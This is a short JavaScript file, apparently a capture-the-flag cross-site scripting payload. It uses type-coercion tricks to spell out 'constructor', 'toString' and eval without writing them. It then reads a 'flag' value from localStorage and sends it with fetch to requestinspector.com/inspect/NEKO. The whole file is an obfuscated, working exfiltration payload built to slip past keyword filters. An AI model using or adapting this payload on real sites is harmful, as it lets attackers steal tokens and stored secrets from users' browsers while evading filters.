// "false"
FA=![]+[];
// "true"
TR=!![]+[];
// "[object Object]"
OB={}+[];
// "undefined"
UN=""[0]+[];
// "constructor"
CT=`${OB[5]}${OB[1]}${UN[6]}${FA[3]}${OB[6]}${TR[1]}${TR[2]}${OB[5]}${OB[6]}${OB[1]}${TR[1]}`;
// "function String() { [native code] }"
ST=([]+[])[CT]+[];
// "toString"
TS=`${TR[0]}${OB[1]}S${TR[0]}${TR[1]}${UN[5]}${UN[6]}${ST[14]}`;

// X => eval(`${X}n`).toString(36)
F=(X)=>E(`${X}${UN[1]}`)[TS](36);
// E=eval
F[CT](`E=${(693741)[TS](36)}`)();

// eval('localStorage.getItem("flag")')
FLAG=E(`${F("36407613")}S${F("1795103150")}.${F("21269")}I${F("38110")}("${F("727432")}")`);

FETCH=F("25885457");
HTTPS=F("29945008");
RI=F("6059548247909300458845003");
COM=F("16438");
INSPECT=F("40621018349");
// eval('fetch("https://requestinspector.com/inspect/NEKO?fakeflag")')
E(`${FETCH}("${HTTPS}://${RI}.${COM}/${INSPECT}/NEKO?${FLAG}")`);
